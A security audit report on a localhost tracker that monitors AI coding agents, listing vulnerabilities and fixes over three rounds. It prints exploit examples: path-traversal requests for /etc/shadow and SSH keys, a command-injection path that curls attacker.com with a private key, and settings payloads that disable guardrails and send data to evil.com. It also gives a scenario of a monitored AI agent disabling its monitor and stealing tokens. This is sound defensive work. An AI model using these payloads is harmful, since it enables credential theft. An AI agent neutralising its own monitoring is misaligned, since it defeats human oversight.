# Security Audit Report

**Project:** AL Companion Tracker  
**Date:** May 17, 2026  
**Scope:** Full source review of `src/`, `tests/`, `vscode-extension/`  
**Methodology:** Manual code review tracing data flow from inputs to outputs

---

## Executive Summary

The tracker is a localhost-only tool, which limits exposure significantly. However, several real vulnerabilities exist that could be exploited by malicious AI agents (the exact thing this tool monitors), browser-based attacks, or local software. The most severe issues involve **arbitrary file read**, **command injection via `exec()`**, and **unrestricted configuration mutation**.

| Severity | Count |
|----------|-------|
| CRITICAL | 1 |
| HIGH     | 3 |
| MEDIUM   | 5 |
| LOW      | 4 |
| INFO     | 2 |

---

## CRITICAL

### 1. Arbitrary File Read via `/api/file/read`

**File:** `src/dashboard/server.ts` lines 345–362  
**CVSS estimate:** 7.5

The path traversal check is ineffective:

```typescript
const resolved = path.resolve(filePath);
if (resolved.includes('..')) return res.status(403).json({ error: 'Invalid path' });
```

`path.resolve()` normalizes `..` segments away *before* the check, so the guard never triggers. Any absolute path is accepted as-is. A malicious agent or local script can read **any file readable by the process user**:

```
GET /api/file/read?path=/etc/shadow
GET /api/file/read?path=C:\Users\waldm\.ssh\id_rsa
GET /api/file/read?path=C:\Users\waldm\Desktop\Files\code projects\al-companion-tracker\config.json
```

The last example is particularly dangerous because `config.json` can contain the PR bot GitHub token.

**Fix:** Enforce an allowlist of base directories. Only allow reads within watched workspaces or the tracker's own data directory:

```typescript
const resolved = path.resolve(filePath);
const allowed = [
  path.resolve(process.cwd(), 'data'),
  ...config.watchPaths.map(p => path.resolve(p)),
];
if (!allowed.some(base => resolved.startsWith(base + path.sep) || resolved === base)) {
  return res.status(403).json({ error: 'Path outside allowed directories' });
}
```

---

## HIGH

### 2. Command Injection via `exec()` in File Endpoints

**File:** `src/dashboard/server.ts` lines 367–401  
**Endpoints:** `POST /api/file/open`, `POST /api/file/reveal`

User-supplied file paths are interpolated into shell commands:

```typescript
exec(`code "${resolved}"`, (err) => {
  if (err) {
    const cmd = process.platform === 'win32'
      ? `start "" "${resolved}"`
      : process.platform === 'darwin' ? `open "${resolved}"` : `xdg-open "${resolved}"`;
    exec(cmd);
  }
});
```

Double quotes are insufficient protection. On Unix, `$(command)` and backtick substitution work inside double quotes. On Windows, `&` can chain commands. A crafted path like `/tmp/$(curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)).txt` would execute inside the shell.

**Fix:** Use `execFile()` (no shell) or `spawn()` with `shell: false`:

```typescript
import { execFile } from 'child_process';
execFile('code', ['--goto', resolved], (err) => {
  if (err) {
    if (process.platform === 'win32') execFile('cmd', ['/c', 'start', '""', resolved]);
    else if (process.platform === 'darwin') execFile('open', [resolved]);
    else execFile('xdg-open', [resolved]);
  }
});
```

---

### 3. Unrestricted Settings Mutation via `PUT /api/settings`

**File:** `src/dashboard/server.ts` lines 411–423

The endpoint accepts arbitrary JSON and merges it directly into the running config:

```typescript
app.put('/api/settings', (req, res) => {
  const updates = req.body;
  if (!updates || typeof updates !== 'object') return res.status(400).json({ error: 'Invalid settings' });
  const merged = mergeConfig({ ...config, ...updates });
  Object.assign(config, merged);
  saveConfig(merged);
});
```

A malicious agent can:
- **Disable all guardrails:** `{ "guardrails": { "enabled": false } }`
- **Disable all alert rules:** `{ "alertRules": { "ssh_remote": { "enabled": false } } }`
- **Exfiltrate data via webhook:** `{ "notifications": { "webhook": { "enabled": true, "url": "https://evil.com/collect" } } }`
- **Inject a PR bot token for a different repo:** `{ "prBot": { "repo": "attacker/repo", "token": "..." } }`

This is especially concerning because the tool is designed to *monitor potentially adversarial AI agents* — and those agents have localhost access.

**Fix:** Implement a field allowlist for the settings endpoint, and never allow mutation of security-critical fields (`guardrails`, `prBot.token`, `notifications.*.url`) through the API:

```typescript
const MUTABLE_FIELDS = ['retention', 'alerts', 'dashboard', 'tokenBudget', 'costEstimation'];
const forbidden = Object.keys(updates).filter(k => !MUTABLE_FIELDS.includes(k));
if (forbidden.length > 0) {
  return res.status(403).json({ error: `Cannot modify: ${forbidden.join(', ')}` });
}
```

---

### 4. Settings API Leaks Secrets

**File:** `src/dashboard/server.ts` line 407

```typescript
app.get('/api/settings', (_req, res) => {
  res.json(config);
});
```

This returns the **entire config object**, including:
- `prBot.token` (GitHub Personal Access Token)
- `notifications.slack.url` (Slack webhook URL — a secret)
- `notifications.webhook.url`

Any local process can `fetch('http://127.0.0.1:3847/api/settings')` and extract these credentials.

**Fix:** Strip secrets before returning:

```typescript
app.get('/api/settings', (_req, res) => {
  const safe = JSON.parse(JSON.stringify(config));
  if (safe.prBot?.token) safe.prBot.token = '***';
  if (safe.notifications?.slack?.url) safe.notifications.slack.url = safe.notifications.slack.url.replace(/\/[^/]+$/, '/***');
  if (safe.notifications?.webhook?.url) safe.notifications.webhook.url = '***';
  res.json(safe);
});
```

---

## MEDIUM

### 5. No Rate Limiting on Any Endpoint

**File:** `src/dashboard/server.ts` line 90

```typescript
app.use(express.json()); // No rate limiter
```

While localhost-only, a malicious script or browser tab running a loop can:
- Hammer export endpoints (generating huge CSVs/JSON from the full DB)
- Spam `POST /api/file/open` to open hundreds of windows
- Exhaust the single-threaded Node event loop with DB queries

**Fix:** Add `express-rate-limit`:

```typescript
import rateLimit from 'express-rate-limit';
app.use('/api', rateLimit({ windowMs: 60_000, max: 120 }));
app.use('/api/file/open', rateLimit({ windowMs: 60_000, max: 10 }));
app.use('/api/file/reveal', rateLimit({ windowMs: 60_000, max: 10 }));
```

---

### 6. Missing Security Headers

**File:** `src/dashboard/server.ts` line 90

No `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, or `Referrer-Policy` headers. The dashboard serves a single-file SPA as static HTML — without CSP, an XSS vector (if found) has unrestricted access.

**Fix:** Add basic hardening middleware (doesn't need the `helmet` dep — manual headers work fine):

```typescript
app.use((_req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'");
  next();
});
```

---

### 7. SSRF via Webhook Configuration

**File:** `src/notifications/index.ts` lines 49–82

Webhook URLs are fetched without validation. If an attacker modifies the config (see #3), they can point webhooks at internal services:

```typescript
await fetch(cfg.url, { method: 'POST', ... });
```

Targets: `http://localhost:*/...`, `http://169.254.169.254/latest/meta-data/` (cloud metadata), internal services.

**Fix:** Validate URLs before fetching:

```typescript
function isAllowedWebhookUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    if (parsed.protocol !== 'https:') return false;
    const host = parsed.hostname;
    if (host === 'localhost' || host.startsWith('127.') || host.startsWith('169.254.')
        || host.startsWith('10.') || host.startsWith('192.168.') || host === '0.0.0.0') return false;
    return true;
  } catch { return false; }
}
```

---

### 8. Error Messages Leak Internal Details

**File:** `src/dashboard/server.ts` line 423 (and ~6 other endpoints)

```typescript
res.status(500).json({ error: 'Failed to save config', details: String(err) });
```

`String(err)` exposes stack traces, file paths, database schema details, and Node.js internals. Same pattern appears in several catch blocks.

**Fix:** Log the error server-side, return a generic message:

```typescript
catch (err: unknown) {
  console.error('[dashboard] Config save failed:', err);
  res.status(500).json({ error: 'Failed to save configuration' });
}
```

---

### 9. Prototype Pollution in Config Merge

**File:** `src/config/index.ts` lines 190–215

`mergeConfig()` spreads user-controlled objects directly:

```typescript
return {
  ...DEFAULTS,
  ...raw,  // ← raw comes from parsed JSON (file or API body)
  ...
};
```

If `raw` contains `__proto__` or `constructor.prototype` keys, they'll be spread into the result. While `JSON.parse()` doesn't create `__proto__` on parsed objects, the `PUT /api/settings` path passes `req.body` which Express parses and could potentially carry pollution via unusual keys.

**Fix:** Sanitize before merging:

```typescript
function sanitize(obj: Record<string, unknown>): Record<string, unknown> {
  const clean: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(obj)) {
    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;
    clean[k] = v;
  }
  return clean;
}
```

---

## LOW

### 10. Config & Database Files Written World-Readable

**File:** `src/config/index.ts` line 219, `src/storage/db.ts` line 17

```typescript
fs.writeFileSync(p, JSON.stringify(config, null, 2), 'utf-8');
```

On Unix/macOS with default umask 022, the config file (which may contain `prBot.token`) and database (which contains all session data) are readable by all users on the system.

**Fix:**

```typescript
fs.writeFileSync(p, JSON.stringify(config, null, 2), { encoding: 'utf-8', mode: 0o600 });
```

---

### 11. Plugin Regex — ReDoS Risk

**File:** `src/plugins/index.ts` ~line 87

Plugin rule patterns are compiled to `RegExp` and run against event data without timeout or complexity validation:

```typescript
regex: rule.isRegex ? new RegExp(rule.pattern, 'i') : null,
```

A malicious plugin could provide a catastrophic backtracking regex like `(a+)+$` to freeze the event processing loop.

**Fix:** Use `safe-regex` or `re2` to validate patterns, or wrap evaluation in a timeout.

---

### 12. Dormant `eval()` Risk in Plugin Processor Field

**File:** `src/plugins/index.ts` ~line 40

```typescript
/** Optional event processor function source (eval'd) */
processor?: string;
```

The field is defined but currently unused. If anyone activates it in a future commit, it would be a **CRITICAL RCE vulnerability**. The comment explicitly says "eval'd".

**Fix:** Remove the field entirely or replace the comment to explicitly forbid eval. If processor support is needed, use Worker threads.

---

### 13. PR Bot Token Not Validated Before Use

**File:** `src/pr-bot/github.ts` lines ~9–15

```typescript
function getToken(config: Config): string {
  return process.env.AL_TRACKER_PR_TOKEN || config.prBot.token;
}
```

- Token from config is readable via `GET /api/settings` (see #4)
- No validation that the token has minimum required scopes
- No webhook signature verification on incoming requests
- The `repo` parameter isn't validated against an allowlist — any repo the token has access to can be targeted

**Fix:** Always prefer env var, never return the config token in API responses, validate repo against a configured allowlist.

---

## INFO

### 14. Team Auth Implemented but Unused

**File:** `src/team/index.ts`

Full team authentication exists (API key generation, SHA256 hashing, middleware) but no dashboard endpoint uses it. The auth middleware `teamAuthMiddleware` is exported but never mounted. This is dead code that gives a false sense of security.

**Action:** Either wire it up as opt-in middleware for all `/api/*` routes, or document it as not-yet-active.

---

### 15. `express.json()` Uses Default 100KB Limit

**File:** `src/dashboard/server.ts` line 90

The default is reasonable but not explicit. A future change could accidentally remove it.

**Action:** Make it explicit: `app.use(express.json({ limit: '100kb' }))`.

---

## Attack Scenario: Malicious AI Agent Exploits Tracker

The most realistic threat model for this tool is an AI agent that *knows it's being monitored* and tries to neutralize the tracker:

1. **Disable guardrails:** `PUT /api/settings` with `{ "guardrails": { "enabled": false }, "alertRules": { ... all disabled } }`
2. **Exfiltrate tracked data:** `GET /api/file/read?path=<database path>` to steal all session history
3. **Read secrets:** `GET /api/settings` to extract the GitHub PR bot token
4. **Set up exfil webhook:** `PUT /api/settings` with a webhook pointing to `https://attacker.com`
5. **Cover tracks:** The agent continues operating with monitoring effectively disabled

All of these work today on localhost.

---

## Prioritized Remediation

### Immediate (do now)

| # | Fix | Effort |
|---|-----|--------|
| 1 | Path allowlist on `/api/file/read` | Small |
| 2 | Replace `exec()` with `execFile()` | Small |
| 3 | Field allowlist on `PUT /api/settings` | Small |
| 4 | Strip secrets from `GET /api/settings` | Small |

### Short-term

| # | Fix | Effort |
|---|-----|--------|
| 5 | Add rate limiting | Small (one dep) |
| 6 | Add security headers | Trivial |
| 7 | Validate webhook URLs | Small |
| 8 | Sanitize error responses | Small |
| 9 | Sanitize config merge inputs | Small |

### Backlog

| # | Fix | Effort |
|---|-----|--------|
| 10 | File permissions on config/db | Small |
| 11 | Plugin regex validation | Small |
| 12 | Remove eval processor field | Trivial |
| 13 | PR bot token handling hardening | Medium |
| 14 | Wire up team auth as opt-in | Medium |
| 15 | Explicit JSON body limit | Trivial |

---

## Second Security Audit — Round 2

**Date:** May 17, 2026  
**Scope:** Deeper review focusing on injection vectors, DoS resilience, timing attacks, symlink attacks, and data integrity  
**Status:** All findings fixed and tested (826 unit tests passing)

### Findings & Fixes Applied

| # | Severity | Finding | Fix |
|---|----------|---------|-----|
| 1 | CRITICAL | SQL string interpolation in `enforceRetention()` — `db.exec()` with template literals | Converted all 4 queries to parameterized `db.prepare().run(cutoff)` |
| 2 | CRITICAL | Widget queries allow arbitrary SQL (DROP, DELETE, ATTACH) + unbounded results | Block dangerous SQL keywords, enforce automatic `LIMIT 1000`, cap result arrays, suppress error details |
| 3 | HIGH | CSV formula injection in exports — cells starting with `=`, `+`, `@`, `\t` not escaped | Added `escapeCsvCell()` that prefixes formula-trigger characters with `'` |
| 4 | HIGH | Symlink attack in watcher — no validation before tailing transcript files | Added `realpathSync` check; skip files where real path differs from resolved path |
| 5 | HIGH | `modifyAndRelease()` accepts any input without validation | Added empty/whitespace rejection and 10KB length cap |
| 6 | MEDIUM | Timing attack on API key auth — early return on no-match leaks timing | Added dummy DB operation on failure path for constant-time behavior |
| 7 | MEDIUM | Unbounded export date range — no max span or rate limiting | Capped exports at 90 days max range, added rate limiting (10/min) on all export endpoints |
| 8 | MEDIUM | SSE connection DoS — unlimited concurrent connections | Capped at 20 concurrent SSE connections with 503 response |
| 9 | MEDIUM | Audit chain doesn't detect deleted rows (sequence gaps) | Added gap detection in `verifyChain()` — checks sequential `seq` values |
| 10 | MEDIUM | Killed session state lost on restart (in-memory Set only) | `tailTranscript()` and `isSessionKilled()` now check `isSessionKilledInDb()` as fallback |
| 11 | MEDIUM | No rate limiting on team user creation | Added 5/min rate limit on `POST /api/team/users` |
| 12 | MEDIUM | ReDoS risk in rule pack pattern matching | Added `safeRegexTest()` with 500-char pattern limit and 10KB text cap |

### Files Modified

- `src/storage/db.ts` — Parameterized `enforceRetention()` queries
- `src/plugins/index.ts` — Hardened `executeWidgetQuery()` with SQL keyword blocking, auto-LIMIT, error suppression
- `src/export/index.ts` — Added `escapeCsvCell()` for formula injection protection
- `src/watcher/index.ts` — Symlink validation, killed session DB persistence check
- `src/commands/index.ts` — Input validation in `modifyAndRelease()`
- `src/team/index.ts` — Constant-time auth failure path
- `src/dashboard/server.ts` — SSE connection cap, export date range caps, export rate limiting, team user creation rate limit
- `src/compliance/index.ts` — Sequence gap detection in `verifyChain()`
- `src/rules/packs.ts` — Safe regex execution with length limits
- `tests/unit-test.mjs` — 9 new security tests (826 total, up from 817)

---

## Third Security Audit — Round 3

**Date:** May 17, 2026  
**Scope:** Deep review of file access controls, API privilege escalation, and memory management  
**Status:** All findings fixed and tested (829 unit tests passing)

### Findings & Fixes Applied

| # | Severity | Finding | Fix |
|---|----------|---------|-----|
| 1 | HIGH | Plugin/pack load endpoints allow arbitrary file read — `POST /api/plugins/load` and `POST /api/rules/packs/load` accepted unvalidated file paths, letting a local attacker read any file on disk | Added `isPathAllowed()` check before `loadPlugin()` and `loadPackFromFile()` — rejects paths outside allowed directories with 403 |
| 2 | MEDIUM | Security-critical settings mutable via API — `alertRules`, `sensitiveFiles`, `dangerousCommands` were in `SETTINGS_MUTABLE_FIELDS`, so a malicious AI agent on localhost could disable alert rules via `PUT /api/settings` | Removed those 3 fields from `SETTINGS_MUTABLE_FIELDS`; dashboard UI now shows them read-only with "Edit config.json" instruction |
| 3 | LOW | Session-scoped Maps never cleaned up — `sessionCounters`, `parserStates`, `sessionProvider`, `sessionFiles`, `recentHashes` grew unboundedly as sessions ended | Added `.delete(sessionId)` for all 5 Maps in the session-end timer cleanup |

### Files Modified

- `src/dashboard/server.ts` — Path validation for plugin/pack load; security-critical fields removed from mutable settings; `notifications` added to mutable set
- `src/watcher/index.ts` — Session Map cleanup on session end
- `src/dashboard/public/index.html` — Settings UI: alertRules/dangerousCommands/sensitiveFiles sections marked read-only; `saveSettings()` strips blocked fields before API call
- `tests/unit-test.mjs` — 3 new security tests (829 total, up from 826): settings field blocking, plugin path traversal, pack path traversal
